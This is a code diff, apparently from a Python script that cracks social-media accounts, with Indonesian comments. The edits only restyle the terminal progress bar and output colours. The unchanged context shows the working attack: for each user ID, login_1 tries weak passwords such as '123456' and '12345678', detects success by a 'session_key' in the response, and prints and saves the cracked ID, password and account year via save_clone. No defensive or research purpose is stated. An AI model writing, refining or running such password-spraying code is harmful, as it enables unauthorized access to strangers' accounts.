@@ -436,17 +436,15 @@ def login_1(uid):
     global loop
     session = requests.session()
     try:
-        sys.stdout.write(
-            f"\r\r\x1b[1;37m│\x1b[38;5;45m-\x1b[1;37m-"
-            f"\x1b[38;5;45m-\x1b[1;37m🌟PARADISE🌟"
-            f"\x1b[38;5;45m------\x1b[1;37m-\x1b[38;5;45m-"
-            f"\x1b[1;37m-\x1b[38;5;45m(\x1b[38;5;192m{loop}"
-            f"\x1b[38;5;45m)\x1b[1;37m-\x1b[38;5;45m-"
-            f"\x1b[1;37m<\x1b[38;5;45m-\x1b[1;37mWOKEH"
-            f"\x1b[38;5;45m-\x1b[1;37m-\x1b[38;5;45m-"
-            f"\x1b[1;37m-\x1b[38;5;45m(\x1b[38;5;192m{len(oks)}"
-            f"\x1b[38;5;45m-"
+        CLEAR = "\033[K"  # hapus baris setiap update
 
+        sys.stdout.write(
+            f"\r{CLEAR}"  # <<< FIX PALING PENTING
+            f"\x1b[1;37m│\x1b[38;5;45m━━━━━\x1b[38;5;220m🌟PARADISE🌟"
+            f"\x1b[38;5;45m━━━━━(\x1b[38;5;220m{loop}"
+            f"\x1b[38;5;45m)━━━━━(\x1b[38;5;220mWOKEH"
+            f"\x1b[38;5;45m)━━━━━((\x1b[38;5;220m{len(oks)}"
+            f"\x1b[38;5;45m)"
         )
         sys.stdout.flush()
         for pw in ('123456', '1234567', '12345678', '123456789'):
@@ -572,9 +570,9 @@ def login_1(uid):
             if 'session_key' in res:
                 print("\x1b[38;5;51m│")
                 print("\x1b[38;5;51m│")
-                print(f"\x1b[38;5;51m├──► \x1b[38;5;129mUID   \x1b[1;37m: {uid}")
+                print(f"\x1b[38;5;51m├──► \x1b[38;5;129mUID   \x1b[38;5;198m: {uid}")
                 print(f"\x1b[38;5;51m│    \x1b[38;5;129mPASS  \x1b[38;5;198m: {pw}")
-                print(f"\x1b[38;5;51m│    \x1b[38;5;129mYEAR  \x1b[38;5;45m: {creationyear(uid)}")
+                print(f"\x1b[38;5;51m│    \x1b[38;5;129mYEAR  \x1b[38;5;198m: {creationyear(uid)}")
                 print("\x1b[38;5;51m│")
                 print("\x1b[38;5;51m│\x1b[0m")
                 save_clone(uid, pw)
@@ -585,7 +583,7 @@ def login_1(uid):
                 print("\x1b[38;5;51m│")
                 print("\x1b[38;5;51m│")
                 print(f"\x1b[38;5;51m├──► \x1b[38;5;129mUID   \x1b[1;37m: {uid}")
-                print(f"\x1b[38;5;51m│    \x1b[38;5;129mPASS  \x1b[38;5;205m: {pw}")
+                print(f"\x1b[38;5;51m│    \x1b[38;5;129mPASS  \x1b[38;5;199m: {pw}")
                 print(f"\x1b[38;5;51m│    \x1b[38;5;129mYEAR  \x1b[38;5;45m: {creationyear(uid)}")
                 print("\x1b[38;5;51m│")
                 print("\x1b[38;5;51m│\x1b[0m")
